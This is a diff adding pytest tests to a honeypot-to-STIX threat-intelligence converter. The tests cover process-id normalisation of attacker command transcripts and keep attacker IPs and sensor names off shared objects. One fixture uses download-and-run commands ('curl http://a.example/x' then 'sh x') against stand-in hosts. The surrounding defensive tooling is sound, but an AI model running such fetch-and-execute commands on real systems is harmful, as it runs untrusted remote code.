@@ -134,3 +134,71 @@ def test_the_process_edge_still_appears_when_the_process_is_kept(cfg):
         and o.get("target_ref", "").startswith("file--")
         for o in objs
     ), "the guard suppressed a legitimate Process→File edge"
+
+
+# --- what the id is actually made of ------------------------------------------
+#
+# Codex's review of PR #43 made the point that the tests above use short, plain
+# command lists, so an implementation that just did "\n".join(commands) would
+# pass all of them. These pin the two transforms that make the id more than a
+# join.
+
+def test_tempfile_paths_are_normalised_into_the_id(cfg):
+    """The scp malware-drop probes are one behaviour, not thousands."""
+    from tpot2cti.stix_ids import generate_process_id
+    a = generate_process_id(["scp -qt /tmp/aB3xK9qmZ"])
+    b = generate_process_id(["scp -qt /tmp/Qw7zLp2vT"])
+    assert a == b, "random tempfile names still fragment Process identity"
+    # ...but the directory is still part of the identity
+    assert a != generate_process_id(["scp -qt /dev/shm/aB3xK9qmZ"])
+
+
+def test_a_path_outside_the_known_temp_dirs_is_not_normalised(cfg):
+    """Documents the known gap rather than pretending it is closed.
+
+    ~222 live transcripts use `scp -t /usr/local/bin/<random>`. They still
+    fragment. This test exists so that widening _TMPFILE_RE is a deliberate
+    change with a failing test, not a silent behaviour shift.
+    """
+    from tpot2cti.stix_ids import generate_process_id
+    assert generate_process_id(["scp -qt /usr/local/bin/aB3xK9qmZ"]) != \
+        generate_process_id(["scp -qt /usr/local/bin/Qw7zLp2vT"])
+
+
+def test_truncated_transcripts_differ_by_tail_not_just_by_count(cfg):
+    """A COUNT in the truncation marker would collide two real transcripts.
+
+    Same first 50 commands, same number omitted, different omitted content:
+    with `... and N more` these were one Process. They are different sessions
+    and must be different objects.
+    """
+    from tpot2cti.stix_ids import generate_process_id, MAX_COMMANDS_PER_PROCESS
+    head = [f"echo {i}" for i in range(MAX_COMMANDS_PER_PROCESS)]
+    a = generate_process_id(head + ["curl http://a.example/x", "sh x"])
+    b = generate_process_id(head + ["curl http://b.example/y", "sh y"])
+    assert a != b, "different omitted tails collapsed into one Process id"
+
+
+def test_the_command_list_must_be_a_list(cfg):
+    """A str slices and iterates happily — it would address on 50 CHARACTERS."""
+    import pytest
+    from tpot2cti.stix_ids import process_command_line
+    with pytest.raises(TypeError):
+        process_command_line("uname -a\nwhoami")
+
+
+# --- the shared object must not claim a single owner --------------------------
+
+def test_the_process_carries_no_per_session_attribution(cfg):
+    """One transcript, two attackers, two sensors — the object is shared, so
+    naming one of them on it would be false for the other."""
+    from tpot2cti.stix.builder import STIXBuilder
+    p = STIXBuilder(cfg).build_process(
+        _session("s1", sensor="sensor01", ip="203.0.113.1"), CMDS,
+    )
+    blob = repr(p)
+    assert "203.0.113.1" not in blob, "source IP is on the shared Process object"
+    assert "sensor01" not in blob, "sensor identity is on the shared Process object"
+    assert not any(l.startswith("sensor:") for l in p["x_opencti_labels"]), \
+        f"sensor label on a shared object: {p['x_opencti_labels']}"
+    assert "command-transcript" in p["x_opencti_labels"], "guard: labels intact"
